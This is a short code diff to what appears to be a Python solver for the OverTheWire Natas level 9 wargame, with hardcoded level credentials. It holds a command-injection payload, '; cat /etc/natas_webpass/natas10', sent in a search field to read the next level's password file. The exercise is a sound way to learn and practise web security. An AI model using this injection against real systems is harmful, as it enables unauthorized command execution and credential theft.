@@ -6,12 +6,12 @@ url = "http://natas9.natas.labs.overthewire.org"
 
 def exp():
     data_post = {
-        "needle": ". /etc/natas_webpass/natas10",
+        "needle": "; cat /etc/natas_webpass/natas10",
         "submit": "Search"
     }
     r = requests.post(url, auth=('natas9', 'ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t'), verify=False, data=data_post)
     if r.status_code == 200:
-        password = re.findall(r'/etc/natas_webpass/natas10:(.*)', r.text)[0]
+        password = re.findall(r'<pre>\s*(\S+)\s*', r.text)[0]
         print("Password for natas10: " + password)
         
 
